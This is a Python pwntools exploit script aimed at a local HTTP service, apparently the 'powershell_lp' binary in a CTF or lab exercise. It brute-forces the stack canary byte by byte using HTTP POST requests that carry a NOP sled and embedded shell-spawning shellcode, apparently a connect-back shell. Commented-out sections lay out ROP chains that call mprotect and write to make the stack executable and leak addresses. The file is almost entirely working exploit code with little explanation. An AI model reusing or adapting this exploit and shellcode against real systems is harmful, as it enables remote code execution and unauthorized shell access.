from pwn import *
import time

context.log_level = 'error'
# http://shell-storm.org/shellcode/files/shellcode-907.php
# https://ret2rop.blogspot.com/2020/05/canary-pie-byte-bruteforce.html
shellcode = 	b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e"
shellcode += 	b"\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee"
shellcode += 	b"\xa3\x80\xff\xff\xfe\x48\xf7\xd9\x51\x54"
shellcode += 	b"\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21"
shellcode += 	b"\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52"
shellcode += 	b"\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
shellcode += 	b"\x51\x54\x5f\x0f\x05"
def exploit(c, i):
	r = remote("127.0.0.1", 8080)
	data = b"JUNKDATA!"
	data += c + i
	r.send(b"POST / HTTP/1.1\r\n")
	r.send(b"Host: 127.0.0.1:8080\r\n")
	r.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
	r.send(f"Content-Length: 4096\r\n\r\n".encode())
	r.send(b"\x90"*4000+shellcode+b"\x90"*30)
	time.sleep(0.1)
	r.send(data)
	# r.interactive()
	# print(r.recvall().hex())
	r.close()

	time.sleep(0.1)
	log = open("ps_server.log").readlines()[-2:]
	for l in log:
		if "status 0" in l:
			return i
	return None

if __name__ == "__main__":
	canary = bytes([])
	while len(canary) < 8:
		for i in range(256):
			new = exploit(canary, bytes([i]))
			if new:
				canary += new
				print(f"CANARY: {canary.hex()}")
				if len(canary) == 8:
					break
				break
	print(f"GOT CANARY: {canary.hex()}")

	# rbp = bytes([])
	# data = b"A"*16
	# for i in range(256):
	# 	new = exploit(canary+data+rbp, bytes([i]))
	# 	if new:
	# 		rbp += new
	# 		print(f"possible: {rbp.hex()}")
	# 		# break
	# # print(f"GOT RBP: {rbp.hex()}")

	# rip = bytes([]) # 0x991a -> __fork()
	# data += rip
	# for i in range(256):
	# 	new = exploit(canary+data+rip, bytes([i]))
	# 	if new:
	# 		rip += new
	# 		print(f"possible: {rip.hex()}")
	# 		# break

	# pie_base = 0x7fa06ad5e91a-0x991a 
	# e = ELF("./powershell_lp")
	# context.binary = e
	# data = b"A"*24
	# # use _dl_make_stack_executable
	# # 1. stack_prot in rax, 0x7 in rdx, mov rdx -> PTR [rax]
	# # 2. pop libc_stack_end into rdi
	# # 3. call _dl_make_stack_executable
	# # 4. push rsp; ret
	# data += p64(pie_base+0x1cca2) + p64(7) # pop 7 into edx
	# data += p64(pie_base+0x1a533) + p64(pie_base+0x2e6bf0) # pop __stack_prot into rsi
	# data += p64(pie_base+0x187e6) # mov edx -> PTR [rsi]
	# data += p64(pie_base+0x8876) + p64(pie_base+0x2e67b0) # pop __libc_stack_end into rdi
	# data += p64(pie_base+0x8f750) # call _dl_make_stack_executable
	# data += p64(pie_base+63869493248+0x1000-90) # jump back to nop sled
	# i dont have enough buffer, need to change the pagesize or something.. (nope lol)

	# data += p64(pie_base+0x8876) # pop rdi; ret
	# data += p64(7) # stdout = 1, child socket fd = 7
	# data += p64(pie_base+0x1a533) # pop rsi; ret
	# data += p64(pie_base+0x2e67b0) # pointer to __libc_stack_end
	# data += p64(pie_base+0x1cca2) # pop rdx; ret
	# data += p64(8) # size of buffer (8 bytes)
	# data += p64(pie_base+0x568c0) # call write
	# print(p64(pie_base+0x568c0).hex())
	# # data += p64(pie_base+0x58f50) # call send
	# # THIS WORKS LFGGG

	# data += p64(pie_base+0x8876) # pop rdi; ret
	# # pop rax with addr, deref rax into itself, pop rdx with addr, pop ??, sub ?? from eax, mov r1 to [r0]
	# # 0x000000000000877f -> pop rax
	# # 0x000000000008f7a9 -> mov [rax] into eax
	# # 0x0000000000022538 -> mov eax into [rdx] 
	# data += p64((0x7ffdcf8b7c78 & 0xfffffffff000) - 0x19000) # __libc_stack_end -> start
	# data += p64(pie_base+0x1a533) # pop rsi; ret
	# data += p64(0x19000 + (0x7ffdcf8b7c78 & 0xfff)) # length (diff between stack pointers)
	# data += p64(pie_base+0x1cca2) # pop rdx; ret
	# data += p64(0x7) # protocol (rwx)
	# data += p64(pie_base+0x57650) # call mprotect
	# # deref r0 into another r1, pop another r2, sub r2 from r1, mov r1 to [r0]
	# data += p64(0x7ffdcf8b7c78-0x750) # jump back to __libc_stack_end? deref the val first
	# # data += p64(pie_base+0x55bdb) # you might have to brute force this.. (no lol)
	# exploit(canary, data)

	# leak rsp with call to write, set up calls to mprotect and shellcode from here

# b *0x00007ffff7d1c919 -> accept call

# b *0x7ffff7d1c82e -> mmap call
# b *0x7ffff7d29e40 -> atoi call

# b *0x00007ffff7d68edf
# b *0x00007ffff7d68d52